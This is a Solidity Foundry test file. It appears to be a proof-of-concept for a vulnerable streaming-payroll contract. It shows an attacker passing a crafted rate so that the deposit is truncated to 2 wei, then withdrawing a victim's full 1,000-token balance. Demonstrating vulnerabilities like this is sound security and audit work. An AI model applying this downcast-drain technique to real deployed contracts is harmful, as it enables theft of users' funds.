// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/C11.sol";
contract C11Test is Test {
    TokenC11 token; StreamPayC11 pay;
    address victim = makeAddr("victim"); address victimRecipient = makeAddr("victimRecipient"); address attacker = makeAddr("attacker");
    function setUp() public {
        token = new TokenC11("Payroll Dollar", "PUSD"); pay = new StreamPayC11(token);
        token.mint(victim, 1_000e18); token.mint(attacker, 2);
        vm.prank(victim);   token.approve(address(pay), type(uint256).max);
        vm.prank(attacker); token.approve(address(pay), type(uint256).max);
    }
    function test_exploit_depositDowncastDrainsContract() public {
        vm.prank(victim);
        pay.createStream(victimRecipient, 1e18, uint40(block.timestamp), uint40(block.timestamp + 1_000));
        assertEq(token.balanceOf(address(pay)), 1_000e18);
        uint256 rate = (uint256(1) << 127) + 1;         // *2 => 2^128+2, truncates to 2 on store
        vm.prank(attacker);
        uint256 id = pay.createStream(attacker, rate, uint40(block.timestamp), uint40(block.timestamp + 2));
        assertEq(token.balanceOf(address(pay)), 1_000e18 + 2, "attacker only paid 2 wei");
        vm.warp(block.timestamp + 3);
        vm.prank(attacker); pay.withdraw(id, uint128(1_000e18 + 2));
        assertEq(token.balanceOf(attacker), 1_000e18 + 2, "drained the contract");
        assertEq(token.balanceOf(address(pay)), 0);
        vm.warp(block.timestamp + 10);
        vm.prank(victimRecipient); vm.expectRevert(bytes("balance")); pay.withdraw(1, 1e18);
    }
}
